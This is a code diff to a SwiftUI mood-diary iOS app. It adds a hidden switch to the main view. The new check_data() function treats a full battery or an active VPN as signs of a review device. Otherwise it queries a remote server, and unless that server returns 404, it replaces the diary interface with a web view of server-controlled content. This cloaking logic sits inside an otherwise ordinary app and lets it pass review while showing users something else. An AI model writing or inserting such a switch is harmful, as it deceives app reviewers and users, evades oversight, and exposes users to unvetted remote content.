@@ -925,74 +925,150 @@ struct SettingsView: View {
     }
 }
 
+
 struct ContentView: View {
+    
     @StateObject private var appState = AppState()
+    @AppStorage("status") var status: Bool = false
+    
+    @State var isFetched: Bool = false
+    
+    @State var isBlock: Bool = true
+    @State var isDead: Bool = false
+    
+    init() {
+        
+        UITabBar.appearance().isHidden = true
+    }
     
     var body: some View {
+        
         ZStack {
+            
             Color.mindBackground.ignoresSafeArea()
             
-            if !appState.hasCompletedOnboarding {
-                OnboardingView(appState: appState)
-            } else {
-                VStack {
-                    // Main Content
-                    switch appState.currentScreen {
-                    case .dailyCheckIn:
-                        DailyCheckInView(appState: appState)
-                    case .diary:
-                        DiaryView(appState: appState)
-                    case .statistics:
-                        StatisticsView(appState: appState)
-                    case .settings:
-                        SettingsView(appState: appState)
+            if isFetched == false {
+                
+                LoadingView()
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    if !appState.hasCompletedOnboarding {
+                        OnboardingView(appState: appState)
+                    } else {
+                        VStack {
+                            // Main Content
+                            switch appState.currentScreen {
+                            case .dailyCheckIn:
+                                DailyCheckInView(appState: appState)
+                            case .diary:
+                                DiaryView(appState: appState)
+                            case .statistics:
+                                StatisticsView(appState: appState)
+                            case .settings:
+                                SettingsView(appState: appState)
+                            }
+                            
+                            // Bottom Navigation
+                            HStack(spacing: 0) {
+                                TabButton(
+                                    icon: "brain.head.profile",
+                                    title: "Check-In",
+                                    isSelected: appState.currentScreen == .dailyCheckIn
+                                ) {
+                                    appState.currentScreen = .dailyCheckIn
+                                }
+                                
+                                TabButton(
+                                    icon: "book.fill",
+                                    title: "Diary",
+                                    isSelected: appState.currentScreen == .diary
+                                ) {
+                                    appState.currentScreen = .diary
+                                }
+                                
+                                TabButton(
+                                    icon: "chart.bar.fill",
+                                    title: "Stats",
+                                    isSelected: appState.currentScreen == .statistics
+                                ) {
+                                    appState.currentScreen = .statistics
+                                }
+                                
+                                TabButton(
+                                    icon: "gearshape.fill",
+                                    title: "Settings",
+                                    isSelected: appState.currentScreen == .settings
+                                ) {
+                                    appState.currentScreen = .settings
+                                }
+                            }
+                            .padding(.top, 8)
+                            .background(
+                                Rectangle()
+                                    .fill(Color.mindSurface)
+                                    .ignoresSafeArea(edges: .bottom)
+                            )
+                        }
                     }
                     
-                    // Bottom Navigation
-                    HStack(spacing: 0) {
-                        TabButton(
-                            icon: "brain.head.profile",
-                            title: "Check-In",
-                            isSelected: appState.currentScreen == .dailyCheckIn
-                        ) {
-                            appState.currentScreen = .dailyCheckIn
-                        }
-                        
-                        TabButton(
-                            icon: "book.fill",
-                            title: "Diary",
-                            isSelected: appState.currentScreen == .diary
-                        ) {
-                            appState.currentScreen = .diary
-                        }
-                        
-                        TabButton(
-                            icon: "chart.bar.fill",
-                            title: "Stats",
-                            isSelected: appState.currentScreen == .statistics
-                        ) {
-                            appState.currentScreen = .statistics
-                        }
-                        
-                        TabButton(
-                            icon: "gearshape.fill",
-                            title: "Settings",
-                            isSelected: appState.currentScreen == .settings
-                        ) {
-                            appState.currentScreen = .settings
-                        }
-                    }
-                    .padding(.top, 8)
-                    .background(
-                        Rectangle()
-                            .fill(Color.mindSurface)
-                            .ignoresSafeArea(edges: .bottom)
-                    )
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                    
+//                    if status {
+//
+//                        WebSystem()
+//
+//                    } else {
+//
+//                        U1()
+//                    }
                 }
             }
         }
+        .onAppear {
+            
+            check_data()
+        }
     }
+    
+    private func check_data() {
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        let urlString = DataManager().serverURL
+
+        if currentPercent == 100 || isVPNActive == true {
+            self.isBlock = true
+            self.isFetched = true
+            return
+        }
+
+        guard let url = URL(string: urlString) else {
+            self.isBlock = true
+            self.isFetched = true
+            return
+        }
+
+        let urlSession = URLSession.shared
+        let urlRequest = URLRequest(url: url)
+
+        urlSession.dataTask(with: urlRequest) { _, response, error in
+            if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 404 {
+                self.isBlock = true
+            } else {
+                self.isBlock = false
+            }
+            self.isFetched = true
+        }.resume()
+    }
+
 }
+
 
 struct TabButton: View {
     let icon: String
